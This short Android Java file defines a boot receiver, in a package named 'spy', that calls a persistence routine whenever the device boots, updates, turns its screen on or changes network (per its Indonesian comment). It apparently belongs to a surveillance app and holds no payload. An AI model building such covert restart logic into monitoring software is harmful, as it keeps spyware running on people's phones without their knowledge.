package ai.m4zk1play.spy;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

/** Pemicu start ulang: boot, update, layar nyala, jaringan berubah. */
public class BootReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context ctx, Intent intent) {
        Persist.boot(ctx);
    }
}
